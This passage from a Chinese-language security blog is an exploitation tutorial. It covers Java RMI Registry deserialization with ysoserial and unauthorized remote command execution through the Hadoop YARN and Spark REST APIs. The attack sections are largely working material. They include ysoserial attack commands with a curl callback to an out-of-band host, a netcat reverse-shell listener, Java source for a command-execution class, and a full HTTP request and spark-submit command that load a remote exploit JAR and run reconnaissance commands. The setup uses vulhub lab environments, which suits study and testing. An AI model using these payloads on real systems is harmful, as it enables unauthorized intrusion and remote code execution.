<p>Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能(虽然大多数情况不允许远程bind)，在bind过程中，伪造Registry接收到的序列化数据(实现了Remote接口或动态代理了实现了Remote接口的对象)，使Registry在对数据进行反序列化时触发相应的利用链(环境用的是commons-collections:3.2.1)</p>
<p>自jdk8u121起，Registry对反序列化的类做了白名单限制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if (String.class == clazz</span><br><span class="line">        || java.lang.Number.class.isAssignableFrom(clazz)</span><br><span class="line">        || Remote.class.isAssignableFrom(clazz)</span><br><span class="line">        || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)</span><br><span class="line">        || UnicastRef.class.isAssignableFrom(clazz)</span><br><span class="line">        || RMIClientSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">        || RMIServerSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">        || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)</span><br><span class="line">        || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">    return ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    return ObjectInputFilter.Status.REJECTED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>refer: <a target="_blank" rel="noopener" href="http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/">http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/</a></p>
<p><strong>漏洞复现</strong></p>
<p>通过ysoserial的exploit包中的RMIRegistryExploit2或者3进行攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 开启JRMPListener</span><br><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 &quot;curl http://xxxxx.burpcollaborator.net&quot;</span><br><span class="line"></span><br><span class="line">// 发起攻击</span><br><span class="line">java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888</span><br></pre></td></tr></table></figure>

<h2 id="0x0F-Apache-Hadoop-x2F-Spark"><a href="#0x0F-Apache-Hadoop-x2F-Spark" class="headerlink" title="0x0F Apache Hadoop&#x2F;Spark"></a>0x0F Apache Hadoop&#x2F;Spark</h2><h3 id="1-Hadoop-YARN-ResourceManager-未授权访问"><a href="#1-Hadoop-YARN-ResourceManager-未授权访问" class="headerlink" title="1. Hadoop YARN ResourceManager 未授权访问"></a>1. Hadoop YARN ResourceManager 未授权访问</h3><p><strong>漏洞描述</strong></p>
<p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构，YARN是hadoop系统上的资源统一管理平台，其主要作用是实现集群资源的统一管理和调度，可以把MapReduce计算框架作为一个应用程序运行在YARN系统之上，通过YARN来管理资源。</p>
<p>YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问，利用其远程执行命令。</p>
<p><strong>环境搭建</strong></p>
<p>使用vulhub搭建环境，环境启动后，访问 <a target="_blank" rel="noopener" href="http://your-ip:8088/">http://your-ip:8088</a> 即可看到Hadoop YARN ResourceManager WebUI页面</p>
<p><strong>漏洞利用</strong></p>
<p>利用过程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1) 在本地监听等待反弹 shell 连接</span><br><span class="line"></span><br><span class="line">2) 调用 New Application API 创建 Application</span><br><span class="line"></span><br><span class="line">3) 调用 Submit Application API 提交</span><br></pre></td></tr></table></figure>

<p>利用<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py">exp</a> 修改lhost反弹shell的IP即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 监听666端口，然后运行exp即可收获shell</span><br><span class="line"></span><br><span class="line">nc -lnvp 6666</span><br><span class="line">python exploit.py</span><br></pre></td></tr></table></figure>

<p>refer: </p>
<ul>
<li><a target="_blank" rel="noopener" href="http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf">http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf</a></li>
</ul>
<h3 id="2-Spark-REST-API未授权漏洞利用分析"><a href="#2-Spark-REST-API未授权漏洞利用分析" class="headerlink" title="2. Spark REST API未授权漏洞利用分析"></a>2. Spark REST API未授权漏洞利用分析</h3><p><strong>漏洞描述</strong></p>
<p>Apache Spark 是专为大规模数据处理而设计的快速通用的计算引擎，是开源的类Hadoop MapReduce的通用并行框架。为了让使用者能够方便的控制系统进行计算和查看任务结果，Spark也提供了 WEB UI图形化界面和相应的 REST API来方便用户操作。</p>
<p>Spark权限设置不当，可能导致攻击者无需认证即可通过该 REST API来操作Spark创建任务、删除任务、查看任务结果等，从而最终获得执行任意指令的能力</p>
<p><strong>漏洞环境</strong></p>
<p>使用vulhub，执行如下命令，将以standalone模式启动一个Apache Spark集群，集群里有一个master与一个slave：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>环境启动后，访问<a target="_blank" rel="noopener" href="http://your-ip:8080/">http://your-ip:8080</a> 即可看到master的管理页面，访问<a target="_blank" rel="noopener" href="http://your-ip:8081/">http://your-ip:8081</a> 即可看到slave的管理页面</p>
<p><strong>漏洞利用</strong></p>
<p>该漏洞本质是未授权的用户可以向管理节点提交一个应用（恶意代码）</p>
<p>提交方式有两种：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) 利用REST API</span><br><span class="line"></span><br><span class="line">2) 利用submissions网关（集成在7077端口中）</span><br></pre></td></tr></table></figure>

<p>应用可以是Java或Python，就是一个最简单的类:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Exploit &#123;</span><br><span class="line">  public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    String[] cmds = args[0].split(&quot;,&quot;);</span><br><span class="line"></span><br><span class="line">    for (String cmd : cmds) &#123;</span><br><span class="line">      System.out.println(cmd);</span><br><span class="line">      System.out.println(executeCommand(cmd.trim()));</span><br><span class="line">      System.out.println(&quot;==============================================&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // https://www.mkyong.com/java/how-to-execute-shell-command-from-java/</span><br><span class="line">  private static String executeCommand(String command) &#123;</span><br><span class="line">    StringBuilder output = new StringBuilder();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      Process p = Runtime.getRuntime().exec(command);</span><br><span class="line">      p.waitFor();</span><br><span class="line">      BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line"></span><br><span class="line">      String line;</span><br><span class="line">      while ((line = reader.readLine()) != null) &#123;</span><br><span class="line">        output.append(line).append(&quot;\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return output.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将其编译成JAR，放在任意一个HTTP或FTP上，如<a target="_blank" rel="noopener" href="https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar">https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar</a></p>
<p><strong>用REST API方式提交应用</strong></p>
<p>standalone模式下，master将在6066端口启动一个HTTP服务器，向这个端口提交REST格式的API：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /v1/submissions/create HTTP/1.1</span><br><span class="line">Host: your-ip:6066</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 680</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;action&quot;: &quot;CreateSubmissionRequest&quot;,</span><br><span class="line">  &quot;clientSparkVersion&quot;: &quot;2.3.1&quot;,</span><br><span class="line">  &quot;appArgs&quot;: [</span><br><span class="line">    &quot;whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;appResource&quot;: &quot;https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar&quot;,</span><br><span class="line">  &quot;environmentVariables&quot;: &#123;</span><br><span class="line">    &quot;SPARK_ENV_LOADED&quot;: &quot;1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;mainClass&quot;: &quot;Exploit&quot;,</span><br><span class="line">  &quot;sparkProperties&quot;: &#123;</span><br><span class="line">    &quot;spark.jars&quot;: &quot;https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar&quot;,</span><br><span class="line">    &quot;spark.driver.supervise&quot;: &quot;false&quot;,</span><br><span class="line">    &quot;spark.app.name&quot;: &quot;Exploit&quot;,</span><br><span class="line">    &quot;spark.eventLog.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;spark.submit.deployMode&quot;: &quot;cluster&quot;,</span><br><span class="line">    &quot;spark.master&quot;: &quot;spark://your-ip:6066&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，spark.jars即是编译好的应用，mainClass是待运行的类，appArgs是传给应用的参数</p>
<p>返回的包中有submissionId，然后访问 <a target="_blank" rel="noopener" href="http://your-ip:8081/logPage/?driverId=%7BsubmissionId%7D&amp;logType=stdout%EF%BC%8C%E5%8D%B3%E5%8F%AF%E6%9F%A5%E7%9C%8B%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C">http://your-ip:8081/logPage/?driverId={submissionId}&amp;logType=stdout，即可查看执行结果</a></p>
<p>注意：提交应用是在master中，查看结果是在具体执行这个应用的slave里（默认8081端口）。实际情况，slave可能有多个</p>
<p><strong>利用submissions网关</strong></p>
<p>如果6066端口不能访问，或做了权限控制，可以利用master的主端口7077，来提交应用</p>
<p>方法是利用Apache Spark自带的脚本 bin&#x2F;spark-submit：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/spark-submit --master spark://your-ip:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id</span><br></pre></td></tr></table></figure>

<p>注意：如果指定的master参数是rest服务器，这个脚本会先尝试使用rest api来提交应用；如果发现不是rest服务器，则会降级到使用submission gateway来提交应用。</p>
<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2490">https://xz.aliyun.com/t/2490</a></li>
</ul>
<h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://javasec.org/">https://javasec.org/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://avd.aliyun.com/">https://avd.aliyun.com/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/HackJava/HackJava">https://github.com/HackJava/HackJava</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v">https://www.yuque.com/tianxiadamutou/zcfd4v</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://www.jrasp.com/case/">http://www.jrasp.com/case/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://javasec.org/java-vuls/">https://javasec.org/java-vuls/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/Firebasky/Java">https://github.com/Firebasky/Java</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/threedr3am/learnjavabug">https://github.com/threedr3am/learnjavabug</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet">https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a> </p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/NickstaDB/SerializationDumper">https://github.com/NickstaDB/SerializationDumper</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a> </p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/JackOfMostTrades/gadgetinspector">https://github.com/JackOfMostTrades/gadgetinspector</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/sv3nbeast/ShiroScan">https://github.com/sv3nbeast/ShiroScan</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/wyzxxz/fastjson_rce_tool">https://github.com/wyzxxz/fastjson_rce_tool</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
</li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Execution/" rel="tag" <i class="fa fa-tag"></i> Execution</a>
              <a href="/tags/Vulnerability/" rel="tag" <i class="fa fa-tag"></i> Vulnerability</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/18896/" rel="prev" title="Linux Rootkit技术研究">
                  <i class="fa fa-chevron-left"></i> Linux Rootkit技术研究
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/72019/" rel="next" title="HIDS数据采集项总结">
                  HIDS数据采集项总结 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">L0n9w4y</span>
</div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  <script src="/js/third-party/pace.js"></script>

  





</body>
</html>
